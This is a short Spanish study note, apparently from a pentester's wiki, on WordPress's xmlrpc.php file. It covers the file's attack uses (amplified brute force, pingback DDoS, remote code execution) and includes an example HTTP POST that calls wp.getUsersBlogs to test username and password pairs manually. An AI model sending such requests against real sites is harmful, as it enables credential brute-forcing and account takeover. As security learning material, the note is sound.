
---

# Definición

> El archivo **`xmlrpc.php`** en WordPress permite la comunicación remota entre el sitio y otras aplicaciones mediante el protocolo **XML-RPC**. Su propósito es habilitar funciones como la publicación remota de contenido y la integración con aplicaciones externas.

## Explotación en Ciberseguridad

Este archivo es conocido por sus vulnerabilidades y ha sido explotado en varios ataques, como:

- **Brute Force Amplificado**: Permite probar múltiples combinaciones de usuario y contraseña en una sola solicitud, evadiendo mecanismos de detección.
    
- **Pingback DDoS**: Se usa para abusar de la función de pingbacks y reflejar tráfico en ataques DDoS.
    
- **Ejecución de Código Remoto (RCE)**: En versiones antiguas o con plugins vulnerables, puede llevar a la ejecución de comandos en el servidor.
    

Si este archivo está habilitado y accesible, representa un vector de ataque importante en WordPress.

----
## Ejemplo de explotación

Si quisiéramos aplicar fuerza bruta en un [WordPress](WordPress.md), tras haber detectado al archivo **xmlrpc.php** como accesible, del mismo modo que lo hace Wpscan pero de forma manual para descubrir credenciales válidas. Sería necesario tramitar una petición por el método POST al archivo **xmlrpc.php**[^1] tramitando una estructura XML como se muestra a continuación:

```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>usuario</value></param> 
<param><value>contraseña</value></param> 
</params> 
</methodCall>
```

---

## Referencias

[^1]: [Repositorio GitHub-Ataque de fuerza bruta XML-RPC](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

---
